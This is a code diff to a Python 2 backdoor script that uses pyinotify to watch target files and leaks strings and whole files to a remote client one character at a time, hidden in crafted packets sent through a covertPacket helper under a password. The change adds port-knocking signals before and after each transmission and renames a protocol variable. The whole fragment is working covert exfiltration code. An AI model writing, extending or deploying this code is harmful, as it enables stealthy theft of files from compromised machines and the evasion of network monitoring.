@@ -15,7 +15,7 @@ import exfil
 
 client = ""
 string = ""
-proto = ""
+protocol = ""
 
 class EventHandler(pyinotify.ProcessEvent):
 	def process_IN_CREATE(self, event):
@@ -52,22 +52,29 @@ def addWatch(target, address, proto):
 		print "added: " + target
 
 def sendMessage(string):
+	recvFunctions.knockCode(client, protocol, True)
 	# encrypt results 
 	for c in string:
 		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
+
+	recvFunctions.knockCode(client, protocol, True)
 
 def removeWatch(target):
 	if (wama.rm_watch(wama.get_wd(target))):
 		print "removed: " + target
 
 def sendFile(target):
+	recvFunctions.knockCode(client, protocol, True)
+
 	with open(target, 'r') as f:
 		while True:
 			c = f.read(1)
 			if not c:
 				break
 			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
+
+	recvFunctions.knockCode(client, protocol, True)
 
 def exfilThread():
 	noti.loop()
